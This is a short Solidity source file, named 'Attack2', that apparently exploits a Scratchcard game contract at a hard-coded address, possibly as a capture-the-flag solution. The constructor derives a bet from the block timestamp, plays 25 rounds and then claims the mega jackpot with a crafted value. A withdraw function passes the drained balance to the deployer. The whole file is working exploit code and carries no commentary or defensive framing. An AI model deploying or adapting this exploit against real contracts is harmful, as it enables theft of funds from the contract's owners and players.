pragma solidity 0.4.24;

import "./Scratchcard.sol";

contract Attack2{
    address owner;
    Scratchcard game = Scratchcard(0x8b8450970A7C25D7517100EEfF0Cb23357c50c86);

    constructor() public payable {
        owner = tx.origin;
        uint val = (now%10**8)*10**10;
        for (uint i=0; i<25; i++) {
            game.play.value(val)();
        }
        game.collectMegaJackpot(2* val - 1);
    }

    function withdraw() public {
        if (msg.sender == owner) {
            msg.sender.transfer(address(this).balance); 
        }
    }

    function () public payable {}
}